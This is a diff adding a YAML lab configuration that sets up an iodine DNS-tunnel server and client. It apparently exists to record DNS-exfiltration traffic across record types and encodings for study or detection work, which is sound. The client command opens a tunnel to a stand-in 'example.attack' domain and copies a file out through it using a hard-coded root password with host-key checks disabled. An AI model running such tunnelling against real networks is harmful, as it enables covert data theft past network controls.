@@ -1,0 +1,41 @@
+dns_attack_server:
+    name: iodine_server
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.20
+    description: |
+      This sets up the IODINE server.
+    setup:
+        type: ansible
+        val: iodine_server_setup
+    run:
+        type: shell
+        val: |-
+          nohup asciinema rec /tmp/iodine_server_{{ variables.record_type }}_{{ variables.encoding }}_{{ variables.passphrase }}.cast -c \'set -x; iodined -4 -c -f 10.0.0.1 example.attack -P {{ variables.passphrase }} & sleep 1\'
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+
+dns_attack_client:
+    name: iodine_client
+    image: ubuntu/focal64
+    ipv4_address: 192.168.0.30
+    description: |
+      This sets up the IODINE client.
+    setup:
+      type: script
+      val: iodine_client_setup.bash
+    run:
+        type: shell
+        val: |-
+          set -x; (iodine -4 -f -P {{ variables.passphrase }} -T{{ variables.record_type }} -O{{ variables.encoding }} -r 127.0.0.1 example.attack) & sleep 20; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no" 10.0.0.1:/root/test-file /tmp/
+
+    artifacts_to_collect:
+      - type: files
+        val: ["/tmp/*.cast"]
+      - type: cli_recording
+        val: ["/tmp/iodine_client_{{ variables.record_type }}_{{ variables.encoding }}_{{ variables.passphrase }}.cast"]
+
+    variables:
+        - record_type: ["null", "srv", "cname", "txt", "private", "mx"]
+        - encoding: ["raw", "base32", "base64", "base128"]
+        - passphrase: ["0xDEADBEEF"]
